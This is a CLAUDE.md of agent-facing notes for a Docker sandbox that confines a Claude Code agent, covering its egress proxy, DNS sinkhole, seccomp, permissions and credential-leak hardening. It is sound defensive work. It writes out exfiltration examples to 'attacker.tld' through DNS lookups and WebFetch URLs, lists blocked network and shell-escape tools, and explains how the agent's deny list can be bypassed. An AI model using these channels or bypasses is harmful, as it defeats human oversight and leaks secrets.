# CLAUDE.md — notes for AI agents working on this repo

Invariants, gotchas, and root causes that are **not obvious from the code** but are load-bearing. Read this before editing `docker-compose.yml`, `seccomp.json`, `Dockerfile`, or the proxy config.

User-facing usage (onboarding, DBs, web UIs, auth, host VS Code settings) lives in `README.md`. Workflow tutorials live in `docs/` (`local-wheels.md`, `overlay-project-plan.md`, `debug-recipes.md`). This file is for *editing the sandbox internals*.

## Script layers

- `scripts/setup.sh` — one-shot wrapper: full onboarding + lifecycle (`--restart`, `--recreate`, `--remove`, `--reset`, `--verify`). Idempotent. Users hit this for 90% of operations.
- `scripts/profile.sh` — granular primitives (`up`, `down`, `attach`, per-service `auth`, `exec`). `setup.sh` calls into it.

Both export `COMPOSE_PROJECT_NAME=macolima-<profile>` and `PROFILE=<profile>` before invoking `docker compose`. The compose file uses `${PROFILE:?...}` so any direct `docker compose` invocation without `PROFILE` set fails fast — keep that guard.

## Non-negotiable invariants

- **Agent runs as UID 1000 (`agent`)**, never root. `cap_drop: ALL`. `no_new_privs=1`. No sudo. The stock Ubuntu SUID set (`chage`, `chfn`, `chsh`, `expiry`, `gpasswd`, `mount`, `newgrp`, `pam_extrausers_chkpwd`, `passwd`, `su`, `umount`, `unix_chkpwd`) is present but neutralized by no_new_privs + dropped caps — any SUID binary outside that stock set is drift, and `verify-sandbox.sh` enforces this on every run by diffing the live `find / -perm /6000 -type f` output against the expected list. **`ssh-agent` and `ssh-keysign` are NOT stock here** — `openssh-client` is deliberately purged (see "VS Code Dev Containers leakage hardening"), so their presence would be drift.
- **Agent has no direct network.** `sandbox-internal` is `internal: true`. Only reachable host is `egress-proxy`.
- **Agent has no working DNS resolver** other than the static `extra_hosts` entries for `egress-proxy`, `postgres`, `mongo`. `internal: true` blocks IP-level egress but **does NOT** block Docker's embedded resolver from forwarding arbitrary names to the host resolver — that path was the DNS-exfil hole closed in audit H2. `claude-agent` runs with `dns: [127.0.0.1]` (sinkhole) and the three internal names live in `/etc/hosts` via `extra_hosts`. Don't replace this with `dns: [127.0.0.11]` to "make Docker DNS work again" — the embedded resolver forwards external names to the host, reopening the side channel. If you need a new internal hostname, add it to the `ipam.config` subnet AND the agent's `extra_hosts`.
- **Sandbox-internal subnet is hard-coded** to `172.30.0.0/24` so static IPs work for `extra_hosts`. Pinned IPs: egress-proxy `.10`, postgres `.20`, mongo `.30`. If that subnet conflicts with a host network, change all four locations together (the network's `ipam.config.subnet`, each service's `ipv4_address`, and `claude-agent`'s `extra_hosts`).
- **Proxy-allowed domains live in `proxy/allowed_domains.txt`.** Shared across profiles. Change → `docker exec egress-proxy-<p> squid -k reconfigure` (zero-downtime; squid validates the new config and keeps the old one running if it has a syntax error). Falls back to `COMPOSE_PROJECT_NAME=macolima-<p> PROFILE=<p> docker compose restart egress-proxy` only when the container is unhealthy. The dashboard (`dashboard/`) and `scripts/with-egress.sh` both use the reconfigure path.
- **Base image is digest-pinned** (`FROM ubuntu:24.04@sha256:...`). Don't replace with a tag.
- **Seccomp is applied at runtime** (`security_opt: seccomp=./seccomp.json`), not baked into the image. Changes take effect on `--force-recreate`, no rebuild.
- **All mount points under `/home/agent/...` must be pre-created in the `Dockerfile`** with `chown agent:agent`. Includes named-volume mount points (otherwise the volume initializes root-owned and the agent can't write).
- **Profile isolation is by `COMPOSE_PROJECT_NAME`.** Different project names = different network/volume suffixes and `container_name:` fields include `${PROFILE}` explicitly so two concurrent profiles don't collide on Docker's global container-name namespace. Don't remove the `${PROFILE}` suffix.

## Persistence map per profile

Everything outside these paths is **wiped on container recreate**:

| Container path | Host path | Notes |
|---|---|---|
| `/workspace` | `/Volumes/DataDrive/repo/<profile>` | Must exist before `up`; `profile.sh` validates. |
| `/home/agent/.claude/` | `/V/.../profiles/<profile>/claude-home/` | Tokens, sessions, MCP, projects |
| `/home/agent/.claude.json` | `/V/.../profiles/<profile>/claude.json` | **Single file, chmod 644, must contain `{}` (not empty).** Missing → login prompt every recreate; empty → JSON parse error. |
| `/home/agent/.cache/` | named volume `cache` (per profile) | npm/uv/pip caches. **Must be named volume** — virtiofs chmod issue, see below. |
| `/home/agent/.config/` | `/V/.../profiles/<profile>/config/` | Holds `gh/`, `glab-cli/`, and `git/config` (git global config, via `GIT_CONFIG_GLOBAL`). gh/glab tokens persist here, not in `~/.claude/`. |
| `/home/agent/.vscode-server/` | named volume `vscode-server` (per project) | **Must be named volume.** |

Volatile (tmpfs): `/tmp`, `/run`, `/home/agent/.npm-global`, `/home/agent/.local`.

Named volumes become `macolima-<profile>_<name>` — separate per profile.

For project-customization patterns (local wheels, overlay images), see `docs/local-wheels.md` and `docs/overlay-project-plan.md`.

## Databases (sibling containers)

User-facing usage is in `README.md` §Databases. Internals worth knowing here:

- **First-init lock-in:** `POSTGRES_USER` / `POSTGRES_PASSWORD` / `POSTGRES_DB` (and `MONGO_INITDB_ROOT_*`) are only consumed by `initdb` on the **first** boot of the DB container, when the named volume is empty. Editing `db.env` afterwards does not change the role inside the running DB. To rotate later: `ALTER USER ... WITH PASSWORD '...';`, or `docker volume rm macolima-<p>_postgres-data` and re-up.
- **Project-specific DSNs** (`WEARDATA_PG_DSN`, `DATABASE_URL`, etc.): define alongside `POSTGRES_*` in `db.env`. The DSN's password component must match `POSTGRES_PASSWORD`; URL-encode reserved chars (`/` → `%2F`, `@` → `%40`, `:` → `%3A`), or sidestep with `openssl rand -hex 24`. Hostname inside the sandbox is `postgres`, never `localhost`.
- **Why named volumes, not bind mounts:** Postgres/Mongo do lots of `fsync`/`rename`/`chmod` and rely on UID 999 ownership. Virtiofs bind mounts from macOS get this wrong. For host-visible backups, `pg_dump` / `mongodump` into `/workspace` (the one bind mount that survives VM rebuild).
- **Don't connect the sandbox to host DBs.** Allowlisting `host.docker.internal` puts a routable path from the agent to services holding real data on your Mac — exactly the coupling the sandbox exists to prevent. If you need real data, dump a subset into the sibling container.
- **Postgres 18 mount path:** keep the compose mount as `postgres-data:/var/lib/postgresql:rw` (NOT `.../data`). pg 18+ manages a major-version subdirectory inside `/var/lib/postgresql` for `pg_upgrade --link`; mounting the old `.../data` path makes the entrypoint refuse to start. Wipe a volume initialized under the old path before re-up.
- **DB caps are dropped, not default.** Both `postgres` and `mongo` services run with `cap_drop: ALL` + `cap_add: [CHOWN, DAC_OVERRIDE, FOWNER, SETGID, SETUID]` — the four the entrypoints actually need (chown the data dir on init, drop privs from root → postgres / mongodb). Don't fall back to the default Docker cap set "for safety"; the default includes `CAP_NET_RAW`, which is never needed here and is a soft landing pad if the agent's superuser creds get misused (the `TODO.md` least-privilege split is the upstream fix for that misuse vector).
- **`db.env` is auto-chmod'd to 600** by `profile.sh`'s `ensure_state()` on every `up`. Older profiles created before audit L1 ran with 644 self-heal on next `up`; the file is also re-asserted as 600 every time, so manual edits that loosen perms are corrected. The companion `db.env.example` template stays 644 (it's not a secret). Don't remove the chmod — `db.env` carries the DB superuser password.
- **TODO — least-privilege split:** the agent currently holds DB admin creds via `db.env`. See `TODO.md`.

## Gotchas with root causes

### Rootfs is NOT read-only
`read_only: true` was tried and removed on the agent container. It breaks VS Code Dev Containers' `/etc/environment` patching with no security gain (non-root + `cap_drop: ALL` already blocks system-dir writes). Stays on `egress-proxy` because Squid doesn't need rootfs writes.

### `.vscode-server` and `.cache` must be named volumes (virtiofs chmod/utime)
Virtiofs on macOS mis-handles `utime()` and `chmod()` during archive/wheel extraction. Two concrete failure modes:

- **`tar: Cannot utime: Operation not permitted`** when the VS Code Dev Containers extension extracts the server tarball into `~/.vscode-server/`.
- **`failed to set permissions for file ... .so: Operation not permitted`** when uv/pip extracts wheels with compiled extensions (`lxml`, `pyarrow`, `psycopg[binary]`, `numpy`, etc.) into `~/.cache/uv/` — uv writes the `.so` then `chmod`s the exec bit; virtiofs returns EPERM because the UID-remapping path doesn't carry permission writes correctly across the macOS→Linux boundary.

Same root cause, same fix: named Docker volumes that live in the VM's ext4 and bypass virtiofs entirely. Trade-off: caches no longer host-visible. Fine — content-addressable, rebuild fast, nothing worth backing up.

If you ever add another package extracted by uv/pip/npm that explodes on permission errors during `--recreate`, **don't add it as another bind mount** — make it a named volume too, and pre-create the dir in the Dockerfile with `chown agent:agent`.

### `.claude.json` single-file bind mount needs chmod 644 AND valid JSON
Single-file bind mounts on Colima virtiofs don't remap UIDs the same way directory mounts do. A 600 file on the host appears as `root:root 600` inside the container → agent can't read. 644 → appears as `agent:agent 644`. The file also must contain **valid JSON** — Claude rejects 0-byte files with `JSON Parse error: Unexpected EOF` and forces a reset prompt. `profile.sh`'s `ensure_state()` seeds `{}\n` with chmod 644 on first use (and re-seeds if the file is 0 bytes, so older broken profiles self-heal on next `up`).

`.credentials.json` inside `.claude/` stays 600 — it's inside a *directory* bind mount, which uses the directory-mount UID remapping path that works correctly.

### Why `.gitconfig` is NOT bind-mounted — use `GIT_CONFIG_GLOBAL` instead
Bind-mounting `~/.gitconfig` as a single file fails with `Device or resource busy` on any `git config --global` write. Root cause: `git config` writes atomically via `rename()` of a temp file over the target. `rename()` can't cross a single-file bind-mount boundary on virtiofs → EBUSY. `gh auth setup-git` hits this too.

Fix: don't mount `.gitconfig` at all. Set `GIT_CONFIG_GLOBAL=/home/agent/.config/git/config` in the compose env, mount the whole `.config/` **directory**. `rename()` within a directory-mounted filesystem works fine. `profile.sh`'s `ensure_state()` pre-creates `.config/git/`. Do not "simplify" by re-adding a `.gitconfig` bind mount — it will silently break `gh auth login` and any other tool that touches git config.

### seccomp: syscalls that must stay in the allowlist

| Syscall | Needed by | Symptom if missing |
|---|---|---|
| `getpgid` | bash job control (glibc `getpgrp()` → `getpgid` syscall) | `bash: initialize_job_control: getpgrp failed: Operation not permitted` |
| `rseq` | glibc thread init | random silent stalls in multithreaded binaries |
| `pidfd_open`, `pidfd_send_signal`, `pidfd_getfd` | modern process mgmt | node/zsh subprocess errors |
| `close_range` | Go/C++ runtimes closing inherited FDs | process startup errors |
| `mknod`, `mknodat` | mkfifo (named pipes) for gitstatusd | p10k "gitstatus failed to initialize" |
| xattr family (`getxattr`, `setxattr`, `lgetxattr`, `fgetxattr`, `removexattr`, `listxattr`, and `l*`/`f*` variants) | tar extraction, apt | silent failures |

### clone3 must return ENOSYS (38), not EPERM
`clone3` takes a struct-pointer arg that seccomp can't inspect, so we can't enforce `!CLONE_NEWUSER` on it. Return `ENOSYS` so glibc falls back to `clone()` (which IS filtered). Any other errno → glibc won't fall back, threading breaks.

### Squid: caps, tmpfs ownership, allowlist policy

- **Caps:** Squid starts as root then drops to the `proxy` user — needs `SETUID`/`SETGID`. Without them: crash-loop exit 134. `NET_BIND_SERVICE` NOT needed (port 3128 is unprivileged). Also `pinger_enable off` in `squid.conf` — ICMP pinger wants `CAP_NET_RAW` we don't grant.
- **Split-phase tmpfs ownership** (root opens `/run/squid.pid` and `cache.log`, proxy user uid 13 writes `access.log` and the cache disk):

  | tmpfs | owner/mode | why |
  |---|---|---|
  | `/var/spool/squid` | `proxy:proxy 0750` | Written only post-drop. |
  | `/var/log/squid` | `root:proxy 0775` | `cache.log` opened by root, `access.log` by proxy — both need to write. |
  | `/run` | default (root:root) | `/run/squid.pid` created by root. Don't add `uid=13` here or PID write fails. |

  Changes only re-apply on `--force-recreate` (not restart). Symptoms map to phase: `Cannot open '...access.log'` = log tmpfs wrong; `failed to open /run/squid.pid` = `/run` was made non-root-writable.
- **Port-restrict non-CONNECT methods:** `acl Safe_ports port 80 443` + `http_access deny !Safe_ports`. Without that, `http_access allow allowed_domains` forwards GET/POST to **any** port on allowed hosts (e.g. `GET http://api.anthropic.com:22/`). For a different non-443 port, add it to `Safe_ports`, not just to `allowed_domains.txt`.
- **CONNECT is restricted to port 443 by an explicit deny.** The rule order is:
  ```
  http_access deny !Safe_ports                  # blocks every method on non-{80,443}
  http_access deny CONNECT !SSL_ports           # blocks CONNECT on anything but 443 (audit H1)
  http_access allow CONNECT SSL_ports allowed_domains
  http_access allow allowed_domains
  http_access deny all
  ```
  The `deny CONNECT !SSL_ports` line is load-bearing. Without it, the `allow allowed_domains` rule (which doesn't bind on method) would match `CONNECT api.anthropic.com:80` and tunnel raw TCP on cleartext port 80 — the bug surfaced by the audit. **Do not delete that line.** `verify-sandbox.sh` includes a probe that POSTs `CONNECT … :80/` through the proxy and expects 4xx; a regression here trips it.
- **Avoid wildcards under vendor parents you don't control.** Default autonomous-mode allowlist lists specific subdomains (`api.anthropic.com`, `console.anthropic.com`, `statsig.anthropic.com`, `api.claude.com`, `claude.ai`) rather than `.anthropic.com` / `.claude.ai`. Wildcards are an exfil channel any time a vendor adds a user-controllable subdomain (status pages, marketing, hosted docs). When a new subdomain 403s, tail the access log to find it. `.vscode-unpkg.net` stays a wildcard because the VS Code extension fetcher legitimately rotates across many subdomains under that single MS-controlled parent.
- **Access log** is tmpfs-backed `proxy:proxy 0640` — forensic trail of every request, resets on `--force-recreate`. Read as the proxy user (see `docs/debug-recipes.md`). For long-term retention, add a second `access_log` directive pointing at a host-bind-mounted file with `proxy` write access.

### Compose network IPAM changes need a full `down`, not just `--force-recreate`

`docker compose up -d --force-recreate` re-creates containers but **does not** re-create networks if their config drifts from what's on the daemon. So any change to `sandbox-internal`'s `ipam.config.subnet`, any service's `ipv4_address`, the agent's `dns:` / `extra_hosts`, or the network's `internal:` flag won't actually land via `recreate` / `rebuild` alone.

Symptom: `Error response from daemon: container <id> is not connected to the network macolima-<p>_sandbox-internal`. The container thinks the new compose says it should be on the network, the network exists with the old IPAM, Docker can't reconcile.

The trap got tripped when audit H2 introduced the static `172.30.0.0/24` subnet + `ipv4_address` per service. For any change in that class, the procedure is:

```bash
COMPOSE_PROFILES=db-postgres scripts/profile.sh <p> down
COMPOSE_PROFILES=db-postgres scripts/profile.sh <p> rebuild
```

`down` removes containers AND the network (named volumes are preserved without `-v`). The `COMPOSE_PROFILES` var must be the same across both calls so DB siblings come back on the new IPAM rather than getting stranded on a recreated network without an attached container. If postgres / mongo were running on the old network when you skipped this step, their `restart: unless-stopped` policy keeps reattaching them to the old network, blocking removal — `docker network ls | grep macolima` then `docker network rm <name>` after stopping all attached containers.

Squid restart, bind-mount changes, env changes, command changes, image changes — none of those need a `down`. Only the IPAM/network-shape class. Don't reflexively `down` for every compose edit.

### DNS lockdown — Docker's embedded resolver does NOT respect `internal: true`

Docker's built-in DNS resolver at `127.0.0.11` answers names for containers on the same network out of its embedded zone, and **forwards every other name to the host's resolver** — which queries authoritative DNS on the real internet. This forwarding happens regardless of whether the network is `internal: true`. So a container on `sandbox-internal` could:

```python
import socket; socket.getaddrinfo("base32-encoded-secret.attacker.tld", 0)
```

…and the attacker's authoritative NS would receive the subdomain label as a query. That's a textbook DNS exfiltration channel, and `internal: true` does not close it.

The fix has three parts in compose:

1. **Static subnet on `sandbox-internal`** (`ipam.config.subnet: 172.30.0.0/24`) — required to pin sibling IPs.
2. **Static IPs on egress-proxy / postgres / mongo** (`networks.sandbox-internal.ipv4_address`).
3. **`claude-agent` gets `dns: [127.0.0.1]`** (sinkhole — no resolver listens there) **plus `extra_hosts`** entries that pre-populate `/etc/hosts` with the three internal names.

End state: any `getaddrinfo("egress-proxy")` resolves via `/etc/hosts`. Any `getaddrinfo("anything.else.tld")` returns NXDOMAIN — the libc resolver tries to query 127.0.0.1, gets ECONNREFUSED, gives up. Docker's embedded resolver is never queried (because we overrode `dns:`).

`verify-sandbox.sh` enforces both halves:
- `getent hosts example.com` must fail (external DNS does not resolve).
- `getent hosts egress-proxy` must succeed (internal hostnames still resolve).

Don't "fix DNS" by reverting `dns:` to Docker's default or adding `127.0.0.11` to it — that re-opens the side channel. If a tool inside the container needs a new internal hostname, add it to `extra_hosts` (and pin its IP via `ipv4_address` if it's a service we own).

### tmpfs mounts under `/home/agent/` need `uid=1000,gid=1000`
A bare `tmpfs: - /path:size=N,nosuid,nodev` mount comes up owned by `root:root` mode 755 and shadows the Dockerfile-created dir → agent can't write → tools populating `~/.local/share` or `~/.npm-global` fail with `cannot make directory ... permission denied`. Always append `uid=1000,gid=1000,mode=0755` to tmpfs entries inside `/home/agent/`. Applies to `.local` and `.npm-global`; `/tmp` and `/run` are system dirs where root:root is correct.

### `setup.sh` must stay bash 3.2-compatible
macOS ships `/bin/bash` 3.2 and `env bash` often resolves to it. No `;;&` case fall-through, no `mapfile`, no `${var,,}`, no associative arrays. When `--github` / `--gitlab` / `--both` need shared logic, use a helper function called from multiple case arms — not `;;&`.

### Claude Code's bwrap sandbox is disabled; the container is the boundary
Claude Code's `Bash` tool wraps every command in `bwrap` (bubblewrap). bwrap implements isolation by calling `unshare(CLONE_NEWUSER)`, which our seccomp filter **correctly blocks** (unprivileged user namespaces are a non-negotiable deny). Result: every Bash call would fail with `bwrap: No permissions to create new namespace`. Two sandboxes with incompatible mechanisms; the container is the stronger outer boundary.

Three load-bearing consequences:

1. **`sandbox.enabled: false`** in `~/.claude/settings.json` — Claude Code uses unsandboxed execution.
2. **`bubblewrap`, `socat`, and `openssh-client` are NOT installed** in the Dockerfile. Each was either dead weight or an exfil path:
   - `bubblewrap` only supported the in-process sandbox (now disabled).
   - `socat` was a raw-TCP exfil channel bypassing the HTTP-only Squid egress.
   - `openssh-client` (`ssh`/`scp`/`sftp`/`ssh-agent`/...) is the tool surface that weaponizes VS Code's `SSH_AUTH_SOCK` forwarding. There is **no host-side VS Code setting** that disables Dev Containers' SSH agent forwarding (`remote.SSH.enableAgentForwarding` only governs the unrelated Remote-SSH extension). The env-level mitigation is `devcontainer.json`'s `remoteEnv: { SSH_AUTH_SOCK: "" }` plus a defense-in-depth `unset SSH_AUTH_SOCK` in `config/.zshrc`. With `openssh-client` gone the socket is unusable regardless. No legitimate agent workflow needs SSH: gh/glab use HTTPS tokens, git remotes are HTTPS, and agent-mode denies `git push|clone|fetch`.
3. **`config/claude-settings.json`** is the per-profile settings template. `ensure_state()` copies it into `profiles/<p>/claude-home/settings.json` on first `up` (only if absent — existing profiles keep customizations).

Do **not** "re-harden" by re-enabling `sandbox.enabled` or re-adding `bubblewrap`/`socat`/`openssh-client`. bwrap's threat model protects a real host filesystem from a rogue command; there is no reachable host filesystem from inside this container.

### Per-profile Claude Code skills are seeded from `config/skills/`
Skills live at `config/skills/<name>/SKILL.md` and are seeded into each profile's `claude-home/skills/<name>/` by `ensure_state()` on first `up` — copy only if absent, so user customisations survive subsequent `up`s. To force-refresh from template: `scripts/profile.sh <p> reset-skills` (backs up to `<name>.bak.<stamp>/`; `clean --deep` sweeps those).

The shipped `audit-sandbox` skill points at the staged `claude_internal_audit.md` rather than duplicating it — so when you edit the audit prompt, no skill change is needed; just re-run `scripts/stage-audit-package.sh <profile>`. README §"Self-audit" covers user invocation.

### Permissions posture: plan interactively, execute autonomously
Two-phase workflow:

- **Planning runs** (you driving, approving each step): uncomment the planning-mode section in `proxy/allowed_domains.txt` (github/pypi/npm/nodejs), restart Squid, do clones/installs/pushes yourself. `permissions.defaultMode: "acceptEdits"` means Edit/Write auto-apply, Bash is prompt-gated.
- **Autonomous runs** (agent driving): re-comment the planning-mode domains, restart Squid. The agent's allow list covers routine read-only/non-destructive Bash; deny list blocks network tools (`curl`, `wget`, `ssh`, `scp`, `rsync`, `git push/clone/fetch`, `gh`, `glab`), package installers (`pip`, `npm`, `uv`, `pipx`, `cargo`, `go install`), shell-escape patterns (`bash -c`, `python -c`, `node -e`, `uv run bash`, `perl`, `ruby`, `lua`, `env`, `xargs`, `eval`), and a few additional shell-out vectors picked up in audit L7: `awk` (gawk's `system()`), `sed` (gnu sed's `e` command), `ssh-keygen`, `git submodule` (fetches via configured URL, bypasses the `git fetch` deny), and `git config` (could rewrite `credential.helper` to a host-reaching shim between scrub passes). `WebSearch` stays on; **`WebFetch` is intentionally OFF the default allow list** — see "WebFetch is server-side egress" below.

The deny list is **defense in depth, not the security boundary**. Claude Code's permission matcher keys on the command prefix; denies can be routed around by wrapper idioms hard to enumerate exhaustively (`find -exec`, `make`, `npm run`, `<interpreter> /tmp/script.<ext>`). When the deny list misses, the real boundary still holds: egress proxy (domain + port allowlist), seccomp (no user namespaces → no in-container bwrap/nsenter), non-root + `cap_drop: ALL`.

The discipline: **if the agent says it needs a new package or fresh clone, that's a planning-phase signal** — exit autonomous mode, you do it, resume. Don't widen agent permissions for one-off installs.

For one-shot planning-mode installs, `scripts/with-egress.sh` automates the toggle/restart/exec/restore/restart loop (`trap` ensures restore even on Ctrl-C):
```bash
scripts/with-egress.sh <p> -- '<cmd>'
scripts/with-egress.sh <p> --with pypi,npm -- '<cmd>'
```
Section tags match `[<tag>]` in `proxy/allowed_domains.txt` (typical: `pypi`, `npm`, `git`). Default opens `pypi` only.

**Concurrency / drift guards** (audit L4) inside `with-egress.sh`:
- A `flock` on `/tmp/with-egress.locks/<profile>.lock` prevents two concurrent invocations on the same profile from racing on the shared allowlist file. Second invocation fails fast with a clear message.
- A sentinel file `/Volumes/DataDrive/.claude-colima/profiles/.egress-widened-<profile>` is written before widening and removed on clean exit. If `with-egress.sh` is SIGKILL'd (or the host crashes), the sentinel survives and `setup.sh --verify` flags it. Manual recovery: `rm` the sentinel, then `docker exec egress-proxy-<p> squid -k reconfigure` for the affected profile to re-read the (already-restored) allowlist.

### `Read(**/.credentials*)` denies are nudges, not gates
The `Read` deny list in `config/claude-settings.json` only governs the **Read tool**. Reading the same files via `Bash(cat:*)`, `Bash(jq:*)`, `Bash(python /tmp/x.py)` etc. is allowed by the corresponding Bash entries — those entries exist for legitimate workflow reasons (project work needs to read project files, even ones whose names happen to match the patterns). The Read denies still narrow the most natural read path; they don't seal it. Don't overclaim them as a containment boundary.

### WebFetch is server-side egress that bypasses the proxy
`WebFetch` runs **on Anthropic's infrastructure**, not inside the container — every URL passed to it is fetched from outside the sandbox network entirely, then the response is shipped back to the agent. The destination server logs the request URL, which means the path/query is a covert exfil channel: `WebFetch("https://attacker.tld/log?token=…")` works regardless of `proxy/allowed_domains.txt`.

The template (`config/claude-settings.json`) intentionally omits the bare `WebFetch` entry from the allow list. Per-project `.claude/settings.local.json` should add narrowly-scoped patterns like `WebFetch(domain:docs.numer.ai)` for the docs sites a project actually consults — see the existing pattern in `.claude/settings.local.json`. **Do not add bare `WebFetch` back to the template's allow list.** If `WebSearch` is sufficient (it returns summaries, not arbitrary URL fetches), prefer that.

### Colima VM delete wipes mount + resource config — always use `scripts/colima-up.sh`
`colima delete` wipes the VM and Colima's persisted config. A subsequent bare `colima start` creates a fresh VM with **2 CPU / 2 GB RAM / 60 GB disk / no host mounts**. That breaks the stack two ways:

1. CPU limit error on container start (`range of CPUs is from 0.01 to 2.00`) — compose asks for `cpus: 4`, fresh VM has 2.
2. Bind-mount error (`error mounting "...squid.conf" ... not a directory`) — `/Volumes/DataDrive` virtiofs mount is gone, Docker auto-creates the missing source as a directory and tries to mount that dir onto a file in the Squid image.

Fix: **always use `scripts/colima-up.sh` after a delete**, never bare `colima start`. The wrapper encodes the required flags (`--cpu 6 --memory 10 --disk 80 --mount-type virtiofs --mount /Volumes/DataDrive/repo:w --mount /Volumes/DataDrive/.claude-colima:w`). Those persist into `colima.yaml` so subsequent stop/start cycles without flags work — until the next delete.

Sanity-check mounts after a VM start:
```bash
colima ssh -- ls /Volumes/DataDrive/repo/nranthony/macolima/proxy/squid.conf
```
External disks live under `_lima/_disks/<name>/datadisk` — `colima delete` doesn't always remove them, hence the cosmetic "disk size cannot be reduced" WARN. To truly reset disk size, stop Colima and `rm -rf` the `_disks/colima/` subdir before starting.

### VS Code Dev Containers leakage hardening
VS Code's Dev Containers extension injects several host→container forwards that **bypass the sandbox network identity**: `SSH_AUTH_SOCK` + the underlying `/tmp/vscode-ssh-auth-*.sock`, the host `.gitconfig` copied into the rootfs overlay, and an IPC-backed `git-credential-helper` shim wired into `~/.config/git/config`. The host-side settings that block the git-config copy and credential helper are documented in `README.md` §"Required host settings"; the in-container/per-repo mechanics are agent-facing and live here:

1. **In-container** (Dockerfile + `config/.zshrc`):
   - `openssh-client` is purged. Closes the SSH exfil path at the tool level: even if the env var + socket leak in, no `ssh`/`scp`/`ssh-add` exists to use them.
   - `config/.zshrc` runs `unset SSH_AUTH_SOCK` so any interactive shell (including `docker exec` paths that bypass `devcontainer.json`'s `remoteEnv`) starts with the env cleared.
2. **Per-repo** (`.devcontainer/devcontainer.json` — canonical copy in `devcontainer-template/devcontainer.json`). Required keys:
   - `"remoteUser": "agent"`, `"containerUser": "agent"` — match the Dockerfile USER.
   - `"updateRemoteUserUID": false` — critical. Without this, VS Code runs `usermod` as root during attach to align UIDs, spawning a root shell that sometimes orphans (the "stray UID-0 process" drift seen in the pre-hardening audit). `"overrideCommand": false` — keep compose's `sleep infinity` as PID 1.
   - `"remoteEnv": { "SSH_AUTH_SOCK": "" }` — the actual fix for SSH-agent injection. `remoteEnv` runs *after* VS Code's auto-injection and overrides the env. The socket file in `/tmp/` may still appear (cosmetic — it accumulates across reattaches and `/tmp` tmpfs only clears on `--force-recreate`) but the env is empty. **Audit/tripwire posture (post-2026-05-09):** both `scripts/audit/probes/env.py` (`no_vscode_ssh_socket`) and `scripts/verify-sandbox.sh` gate the socket check on the *combination* of mitigations — DRIFT/FAIL only fires when sockets are present AND (`SSH_AUTH_SOCK` set OR `ssh` resolvable). Pre-fix, both probes flagged the cosmetic-only state and shared the same blind spot. Don't revert that gating to a bare `glob`/`ls` check — it produces false-positive DRIFT on every multi-attach session.
   - Workspace-scoped fallback for git-config copy + credential helper, under `customizations.vscode.settings` (NOT a top-level `settings` key — that location was deprecated and is silently ignored, which masked H2-style drift in the 2026-04-25 audit):
     ```jsonc
     "customizations": { "vscode": { "settings": {
       "dev.containers.copyGitConfig": false,
       "dev.containers.gitCredentialHelperConfigLocation": "none"
     } } }
     ```

**`ensure_state()` defensive scrub:** on every `up`, `profile.sh` scans `profiles/<p>/config/git/config` for helpers matching `vscode-server | vscode-remote-containers | osxkeychain | git-credential-manager` and strips only those lines. VS Code re-injects the helper *on every attach*, *after* `ensure_state()` has already run — the scrub is a stale defense within an attach session; the host setting (`gitCredentialHelperConfigLocation: "none"`) is what actually prevents re-injection. **The scrub intentionally preserves `!/usr/local/bin/glab auth git-credential` and `!/usr/local/bin/gh auth git-credential`** — legitimate in-container helpers installed by `glab/gh auth setup-git`, using in-container tokens with no host reach. Do not broaden the scrub to "any helper" — that would break authenticated `git push`. `verify-sandbox.sh`'s tripwire uses the same host-reaching patterns, so benign glab/gh helpers PASS.

**`VSCODE_GIT_ASKPASS_*` envs** (informational): the same attach mechanism exports `GIT_ASKPASS`, `VSCODE_GIT_ASKPASS_NODE`, `VSCODE_GIT_ASKPASS_MAIN`, `VSCODE_GIT_IPC_HANDLE`, routing `git` HTTPS auth prompts through host VS Code. With autonomous mode's `git push|clone|fetch|pull` denies these are dormant; in planning mode they become a host-reaching prompt path. **Don't paste a host credential into a container `git` prompt** — VS Code will happily relay it.

### Ubuntu 24.04 default `ubuntu` user at UID 1000
Dockerfile does `userdel -r ubuntu 2>/dev/null || true` before creating `agent` at UID 1000. Don't remove that line.

### VS Code re-attach after container recreate
`docker compose up -d --force-recreate` changes the container ID. VS Code Dev Containers caches attachment by ID. After recreate: `Remote: Close Remote Connection` → re-attach, or reload window, or relaunch VS Code.

### gh/glab and the proxy
`gh` and `glab` are installed at build time (direct internet via host daemon). At runtime they go through Squid. `gh auth login` uses `github.com` + `api.github.com` (matched by `.github.com` wildcard); `glab` uses `gitlab.com` (covered by `.gitlab.com`). For self-hosted GitLab, add the hostname to `allowed_domains.txt` before auth.

**OAuth browser flow is structurally broken** — both default to a callback on `http://localhost:<port>` inside the container, which the host browser can't reach because `sandbox-internal` is `internal: true` with no published ports (by design, not a bug to fix). Token flow only. README §Authentication has the user-facing scope list.

**Build-time integrity for `glab`** (audit L3): the Dockerfile fetches GitLab's published `checksums.txt` alongside the release tarball, greps the line matching the platform-specific filename, and pipes to `sha256sum -c -` before extracting. A one-time compromise of the GitLab release CDN between two builds would cause this check to fail rather than silently land a malicious binary. When bumping `GLAB_VERSION`, no manual SHA pin is needed — `checksums.txt` is fetched fresh per build and the integrity assertion is "tarball matches what GitLab says it should be." Compare to `gitstatusd` which uses the same pattern via p10k's `install.info`. The other build-time fetches (`curl|sh` for nodesource/uv/ohmyzsh, `npm install -g … @latest`) are still trusted-on-TLS; tightening those to checksum'd installers is open hygiene work, but glab was the one carrying CVEs in `.trivyignore` and getting it pinned matters most.

## Editing checklist

Before committing:

- [ ] New `/home/agent/...` mount point? Pre-create it in `Dockerfile` + `chown agent:agent`.
- [ ] New seccomp allowance? Document the syscall and why in the comment above the `names` array.
- [ ] New allowed domain? Justify with a one-line comment above its block.
- [ ] New internal hostname (besides egress-proxy/postgres/mongo)? Add it to `claude-agent`'s `extra_hosts` AND give the target service a static `ipv4_address` in the `172.30.0.0/24` subnet. Don't rely on Docker's embedded resolver — it's bypassed by `dns: [127.0.0.1]`.
- [ ] New build-time download (curl, wget, npm install) of a non-package binary? Add a checksum verification step (compare gitstatusd / glab in `Dockerfile`).
- [ ] New entry in `permissions.allow`? Run through the L7 question list: does it provide a shell-out path (`-c`, `-e`, `system()`, `exec`, scripted-input)? If so, deny it instead.
- [ ] Compose change? Run `PROFILE=_test docker compose config` to validate YAML interpolation.
- [ ] Dockerfile / `.zshrc` / `.p10k.zsh` change? Need rebuild: `scripts/profile.sh build`, then `scripts/profile.sh <p> rebuild` per running profile.

Routine debug commands moved to `docs/debug-recipes.md`. Accepted CVEs/misconfigs in `.trivyignore.yaml` with dated `expired_at` fields.

## What NOT to do

- Don't `docker compose` directly without `PROFILE` set — use `scripts/profile.sh`.
- Don't add `read_only: true` to the agent container.
- Don't mount `.vscode-server` or `.cache` as drive bind mounts — named volumes only.
